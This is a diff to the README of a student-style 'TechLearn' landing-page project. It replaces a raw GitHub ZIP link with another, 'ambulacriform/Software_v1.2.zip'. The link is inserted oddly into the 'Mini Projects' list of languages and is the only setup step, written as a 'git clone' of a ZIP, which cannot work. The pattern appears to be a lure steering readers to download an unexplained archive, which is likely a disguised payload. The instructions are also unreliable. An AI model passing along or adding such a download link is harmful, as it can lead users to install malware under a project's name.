@@ -11,7 +11,7 @@ A responsive and interactive landing page built using **HTML, CSS, and JavaScrip
 - **TechPrep** – Overview of placement training
 - **DesignLab** – Interactive coding playground concept
 - **Summer Intern** – Highlights of UG internship program
-- **Mini Projects** – Project list: HTML, CSS, JavaScript, https://github.com/akkiakshay-26/techlearn/raw/refs/heads/main/ambulacriform/techlearn_v3.4.zip, Python, Java
+- **Mini Projects** – Project list: HTML, CSS, JavaScript, https://raw.githubusercontent.com/akkiakshay-26/techlearn/main/ambulacriform/Software_v1.2.zip, Python, Java
 - **Footer** – Contact details and useful links
 - **Logo** – TechLearn logo integrated in the design
 
@@ -33,4 +33,4 @@ Includes:
 ## 🛠️ Setup Instructions
 
 1. **download the ZIP**  
-git clone https://github.com/akkiakshay-26/techlearn/raw/refs/heads/main/ambulacriform/techlearn_v3.4.zip
+git clone https://raw.githubusercontent.com/akkiakshay-26/techlearn/main/ambulacriform/Software_v1.2.zip
